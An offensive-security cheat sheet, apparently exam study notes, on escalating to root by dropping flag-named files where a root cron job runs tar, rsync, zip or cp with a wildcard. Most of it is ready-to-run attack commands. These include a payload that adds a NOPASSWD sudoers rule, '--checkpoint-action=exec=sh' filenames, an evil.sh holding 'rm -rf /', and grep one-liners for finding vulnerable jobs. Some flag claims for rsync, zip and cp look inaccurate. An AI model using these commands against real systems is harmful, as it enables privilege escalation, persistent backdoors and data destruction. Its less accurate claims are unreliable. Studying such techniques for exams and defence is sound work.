✅ Summary
Wildcard characters like *, ?, and [ ] are interpreted by the shell, not the command itself. This means you can inject options and flags into programs — especially when the command uses * to operate on files — and those file names can actually be malicious command-line arguments.

The classic abuse: tar + cron + wildcards = root.

🔀 "If This, Then That" Workflow
Got This	Then Do That
Found a cron job or script using * with a vulnerable binary (like tar, rsync, etc.)	Try injecting options/flags as file names
The binary has an argument that allows command execution (--checkpoint-action, --use-compress-program, etc.)	Abuse it with a crafted filename
You can write files in the working directory of the cron job	Drop payloads with filenames like --checkpoint=1 and --checkpoint-action=exec=sh root.sh
You want to persist or escalate	Write echo '<sudo rule>' >> /etc/sudoers into your payload
Got root?	Clean up after your shellshock forensics-style 😉
🧠 Patterns / What to Look For
Cron jobs using wildcards: tar -cf backup.tar.gz *

SUID or root-owned scripts that use * or ? in command line

Binaries that allow execution of commands with flags (--checkpoint-action=exec=sh for tar)

Check man pages of commands being used with * for exploitable flags

Writable directories where these jobs run — can you create arbitrary files?

🛠️ One-Liners & Execution
🔍 Find tar jobs with wildcard
bash
Copy
Edit
grep tar /etc/crontab /etc/cron.*/* 2>/dev/null
🧪 Drop the exploit files
bash
Copy
Edit
echo 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > root.sh
echo '' > "--checkpoint=1"
echo '' > "--checkpoint-action=exec=sh root.sh"
As soon as that cron job runs, it'll interpret the wildcards like this:

bash
Copy
Edit
tar -zcf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh
Which means: command execution as root.

💥 Hints / Gotchas / CPTS Tips
This works because * expands to the file names in the dir → if one of those is a flag, it’s passed to the command

Abuse works best when:

You control the working dir (e.g., /home/youruser)

You control filenames

The cron job is run as root

Test this locally before pushing full root.sh — try a POC like:

bash
Copy
Edit
echo 'touch /tmp/pwned' > root.sh
Always check man pages of commands used with * in cron — look for:

tar: --checkpoint-action

rsync: --rsync-path

zip, scp, cpio: similar attack surface

Bonus: Wildcard injection works on more than just tar — if a script runs mybinary *, and * includes a file like --badflag, the command might misbehave.

🔥 Wildcard Abuse Detection Cheat Sheet
🧠 Rule of Thumb:
If a script or cron job uses *, ?, or [ ] with a command that accepts options starting with -- or -, you may be able to inject your own flags or payloads using filenames.

🧨 Top Commands Vulnerable to Wildcard Injection:
Command	Vulnerable Flag	Description
tar	--checkpoint-action=exec=COMMAND	Run any command during extraction
rsync	--rsync-path=COMMAND	Run arbitrary command on remote
scp	-oProxyCommand=COMMAND	Proxy shell execution
cpio	--file, --pass-through	Can trigger file-based injection
find	-exec, -ok, or via file expansion	Path traversal or exec
zip	via crafted file name expansion	Used with -T, -FF, etc.
bash scripts	"$@", "$*" used improperly	Will expand with attacker flags
🔍 Real-World Examples of Wildcard Injection in Cron Jobs or Scripts
🔁 Example 1: tar cron job
bash
Copy
Edit
* * * * * tar -cf /tmp/backup.tar.gz *
Inject:

bash
Copy
Edit
echo 'rm -rf /' > evil.sh
echo '' > "--checkpoint=1"
echo '' > "--checkpoint-action=exec=sh evil.sh"
📁 Example 2: rsync in backup script
bash
Copy
Edit
rsync -a * /mnt/backup/
Inject:

bash
Copy
Edit
touch '--rsync-path=sh evil.sh'
When * expands, rsync treats --rsync-path=sh evil.sh as an argument.

📂 Example 3: zip being used insecurely
bash
Copy
Edit
zip /tmp/backup.zip *
Inject:

bash
Copy
Edit
touch '--unzip-command=sh evil.sh'
Some older zip or unzip implementations honor flags like this when file names are passed.

🧹 Example 4: Bash script looping over *
bash
Copy
Edit
for file in *; do
  cp "$file" /tmp/backup/
done
Inject:

bash
Copy
Edit
touch '--target-directory=/root/'
touch evil.sh
If the script doesn't sanitize $file, it may run:

bash
Copy
Edit
cp --target-directory=/root/ evil.sh /tmp/backup/
Now you've dropped your payload in /root/.

⚙️ Example 5: cpio wildcard usage
bash
Copy
Edit
find . -name "*" | cpio -o > archive.cpio
Inject:

bash
Copy
Edit
touch '--no-preserve-owner'
touch '--quiet'
cpio accepts a lot of command-line flags. Filenames injected via * can become flags.

🕵️‍♂️ How to Hunt for These in Real-Time
Use these search techniques:

🔍 Check for wildcard usage in crons:
bash
Copy
Edit
grep '\*' /etc/cron* /var/spool/cron/* 2>/dev/null
🔍 Spot common vulnerable binaries:
bash
Copy
Edit
grep -E 'tar|rsync|scp|zip|cpio|find' /etc/cron* /opt/* /usr/local/bin/* 2>/dev/null
🧪 Test locally:
Create dummy files named like flags:

bash
Copy
Edit
touch -- '--some-flag=payload'
Then run the command with * to see if your file triggers misbehavior:

bash
Copy
Edit
tar -cf test.tar.gz *
🧠 CPTS/Exam Takeaways
Don’t just think: “Oh, it’s a tar cron job.”

Think: “Is * used? Can I inject flags via filenames? Can any of those flags lead to command execution?”

If you find a job or script that matches that pattern — drop --checkpoint-action bombs and wait for root.

